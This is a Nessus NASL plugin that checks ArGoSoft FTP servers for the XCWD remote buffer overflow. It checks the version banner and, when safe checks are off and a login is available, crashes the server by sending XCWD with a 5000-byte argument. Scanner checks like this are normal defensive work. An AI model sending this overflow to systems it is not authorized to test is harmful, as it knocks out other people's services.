#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from Tenable Network Security
#
#  Ref: Moran Zavdi <moran@moozatech.com>
#
#  This script is released under the GNU GPL v2
#


include("compat.inc");

if(description)
{
 script_id(15439);
 script_version ("$Revision: 1.9 $");
 script_bugtraq_id(8704);
 script_xref(name:"OSVDB", value:"2618");

 script_name(english:"ArGoSoft FTP Server XCWD Remote Overflow");
 script_summary(english:"Attempts a XCWD buffer overflow");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running an FTP server which is affected by a remote
buffer overrun vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the ArGoSoft FTP server.

It was possible to shut down the remote FTP server by issuing
a XCWD command followed by a too long argument.

This problem allows an attacker to prevent the remote site i
from sharing some resources with the rest of the world." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/vuln-dev/2003-q3/0169.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to 1.4.1.2 or newer." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
 script_family(english:"FTP");
 script_dependencie("find_service1.nasl", "ftp_anonymous.nasl",
 		    "ftpserver_detect_type_nd_version.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 
 exit(0);
}

#
# The script code starts here
#

include("ftp_func.inc");
port = get_kb_item("Services/ftp");
if(!port)port = 21;

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if (get_kb_item('ftp/'+port+'/broken') ||
    get_kb_item('ftp/'+port+'/backdoor')) exit(0);


if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
    if (safe_checks() || ! login)
    {
    	banner = get_ftp_banner(port: port);
	if ( ! banner ) exit(0);
	#220 ArGoSoft FTP Server for Windows NT/2000/XP, Version 1.4 (1.4.1.1)
	if (egrep(pattern:".*ArGoSoft FTP Server .* Version .* \((0\.|1\.([0-3]\.|4(\.0|\.1\.[01])))\).*", string:banner) ) security_warning(port);
	exit(0);
    }
    else
    {
      if(ftp_authenticate(socket:soc, user:login, pass:password))
      {
   	s = string("XCWD ", crap(5000), "\r\n");
   	send(socket:soc, data:s);
   	r = recv_line(socket:soc, length:1024);
   	close(soc);
       
        soc = open_sock_tcp(port);
        if(!soc)
        {
          security_warning(port);
     	  exit(0);
        }
      }
      close(soc);
    }
  }
}
